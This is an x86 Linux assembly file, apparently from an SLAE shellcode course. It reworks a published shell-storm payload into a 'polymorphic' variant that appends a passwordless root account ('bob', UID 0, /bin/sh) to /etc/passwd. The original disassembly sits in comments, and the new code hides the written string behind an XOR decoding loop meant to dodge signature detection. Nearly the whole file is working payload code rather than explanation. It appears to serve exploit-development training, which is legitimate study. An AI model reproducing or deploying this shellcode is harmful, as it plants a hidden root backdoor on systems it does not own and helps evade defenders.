 ; Shell-storm.org/shellcode/files/shellcode-548.php
 ; adds a root user no-passwd to /etc/passwd 83 bytes
 ; Polymorphic version 
 ; Author : Alain Menelet
 ; StudentID:  SLAE-


 ;804a040 <code>:
 ;804a040:	31 c0                	xor    eax,eax
 ;804a042:	31 db                	xor    ebx,ebx
 ;804a044:	31 c9                	xor    ecx,ecx
 ;804a046:	53                   	push   ebx
 ;804a047:	68 73 73 77 64       	push   0x64777373
 ;804a04c:	68 63 2f 70 61       	push   0x61702f63
 ;804a051:	68 2f 2f 65 74       	push   0x74652f2f
 ;804a056:	89 e3                	mov    ebx,esp
 ;804a058:	66 b9 01 04          	mov    cx,0x401
 ;804a05c:	b0 05                	mov    al,0x5
 ;804a05e:	cd 80                	int    0x80
 ;804a060:	89 c3                	mov    ebx,eax
 ;804a062:	31 c0                	xor    eax,eax
 ;804a064:	31 d2                	xor    edx,edx
 ;804a066:	68 6e 2f 73 68       	push   0x68732f6e
 ;804a06b:	68 2f 2f 62 69       	push   0x69622f2f
 ;804a070:	68 3a 3a 2f 3a       	push   0x3a2f3a3a
 ;804a075:	68 3a 30 3a 30       	push   0x303a303a
 ;804a07a:	68 62 6f 62 3a       	push   0x3a626f62
 ;804a07f:	89 e1                	mov    ecx,esp
 ;804a081:	b2 14                	mov    dl,0x14
 ;804a083:	b0 04                	mov    al,0x4
 ;804a085:	cd 80                	int    0x80
 ;804a087:	31 c0                	xor    eax,eax
 ;804a089:	b0 06                	mov    al,0x6
 ;804a08b:	cd 80                	int    0x80
 ;804a08d:	31 c0                	xor    eax,eax
 ;804a08f:	b0 01                	mov    al,0x1
 ;804a091:	cd 80                	int    0x80


 global _start

 section .text
	
 _start:
	
	xor ebx, ebx
	mul ebx
	mov ecx, ebx
	push ebx
	push 0x64777373		; cwss
	push 0x61702f63		; ap/c
	push 0x74652f2f		; te//
	mov ebx, esp
	mov ch, 0x4
	mov cl, 0x1
	push ecx
	inc ch
	mov al, ch
	pop ecx			; open('/etc/passwd', O_WRONLY | )
	int 0x80

	xchg   ebx,eax		; Save the result

	xor    eax,eax
	push   0x859ec283	; hs/n
	push   0x848fc2c2	; ib//
	push   0xd7c2d7d7	; :/::
 	push   0xddd7ddd7	; 0:0:
	push   0xd78f828f	; :bob
 	mov    esi,esp
 	mov cl, 0x14
	
_:
	xor byte [esi], 0xed
	inc esi
	loopne _
	mov ecx, esp

 	mov    dl,0x14
 	mov    al,0x4		; write ('/etc/passwd', 'bob:0:0::/://bin/sh')
 	int    0x80

 	xor    edx,edx
	mov eax, edx		
 	mov    al,0x6
 	int    0x80		; close the file descriptor
 	
	mov eax, edx		
 	mov    al,0x1
 	int    0x80		; exit
